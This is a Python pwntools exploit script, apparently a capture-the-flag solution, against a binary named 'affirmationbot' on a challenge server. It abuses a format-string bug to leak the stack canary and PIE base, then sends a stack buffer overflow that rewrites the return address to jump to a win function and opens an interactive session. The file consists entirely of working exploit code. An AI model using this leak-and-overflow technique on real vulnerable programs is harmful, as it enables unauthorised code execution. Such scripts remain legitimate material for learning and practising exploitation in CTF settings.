#!/usr/bin/env python3

from pwn import *

exe = ELF("./affirmationbot_patched")

context.binary = exe
context.terminal = ["alacritty", "-e"]
gdb_script = """
b main
b affirm
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("chal.wwctf.com", 4001)

    return r


def main():
    r = conn()
    # LEAK CANARY
    payloadCanary = b'%47$p'
    offsetToCanary = 136
    r.sendlineafter('>', payloadCanary)
    canary = int(r.recvline().split(b' You said: ')[1].strip(b'\n'), 16)
    print(hex(canary))

    # LEAK PIE BASE
    # payloadPie = "%31$p" # remote
    payloadPie = "%52$p" # local
    r.sendlineafter('>', payloadPie)
    leakPie = int(r.recvline().split(b' You said: ')[1].strip(b'\n'), 16)
    basePie = leakPie - 0x147c # main addr
    print(hex(basePie))
    winAddr = basePie + 0x11e9

    # RET2WIN
    payload = b'A' * offsetToCanary
    payload += p64(canary)
    payload += b'A' * 8 # rbp
    payload += p64(winAddr) # rip

    r.sendlineafter('>', payload)
    r.interactive()


if __name__ == "__main__":
    main()

